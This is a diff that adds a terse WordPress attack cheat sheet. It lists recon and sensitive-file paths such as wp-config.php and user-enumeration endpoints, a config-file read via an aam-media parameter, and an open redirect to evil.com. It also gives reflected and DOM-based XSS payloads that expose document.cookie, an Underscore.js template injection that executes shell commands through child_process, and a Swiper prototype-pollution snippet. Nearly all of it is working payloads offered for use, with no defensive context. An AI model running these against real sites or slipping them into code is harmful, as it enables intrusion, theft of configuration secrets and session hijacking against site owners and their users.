@@ -1,0 +1,60 @@
+Files to Check for:-
+/xmlrpc.php
+/wp-admin/options.php
+/sitemanager/login.php?
+/wordpress/wp-includes/Text/Diff/Engine/
+/wp-includes/Text/Diff/Engine/shell.php
+/wp-admin/setup-config.php
+/wp-json/wp/v2/users/
+/wp-json/wp/v2/
+/wp-includes/wlwmanifest.xml
+/?aam-media=wp-config.php
+/wp-login.php?action=register
+/wp-content/themes/
+/wp-includes
+/wp-sitemap-users-1.xml
+/wp-sitemap-posts-mailpoet_page-1.xml
+/feed/rdf/ 
+
+
+----Sensitive-----
+/wp-db.php
+/wp-activate.php
+/wp-config.php
+
+
+
+
+For the sites using onelogin:-
+https://hackerone.com/reports/136169
+
+For Open Redirect:-
+
+/wp-admin/admin-ajax.php?action=kc_get_thumbn&id=https://evil.com
+
+
+For Reflected XSS:-
+
+/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc%3C!%3Eusin+alert(0)%0c
+
+/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D
+
+
+For DOM-XSS [elementor]
+
+/#elementor-action:action=lightbox&settings=ewogICAgInR5cGUiOiAidmlkZW8iLAogICAgInVybCI6ICJodHRwOi8vIiwKICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwKICAgICJ2aWRlb1BhcmFtcyI6IHsKICAgICAgICAib25lcnJvciI6ImFsZXJ0KGRvY3VtZW50LmRvbWFpbisnICcrZG9jdW1lbnQuY29va2llKSIsCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIgogICAgfQp9
+
+
+
+Arbitary Code Injection [Underscore_JS]
+
+const _ = require('underscore'); _.templateSettings.variable = "a = this.process.mainModule.require('child_process').execSync('touch HELLO')"; const t = _.template("")();
+
+
+Prototype Pollution [Swiper JS]
+
+var swiper = require('swiper');
+var malicious_payload = '{"__proto__":{"polluted":"HACKED"}}';
+console.log("Before: " + {}.polluted); // undefined
+swiper.default.extendDefaults(JSON.parse(malicious_payload));
+console.log("After: " + {}.polluted); // HACKED
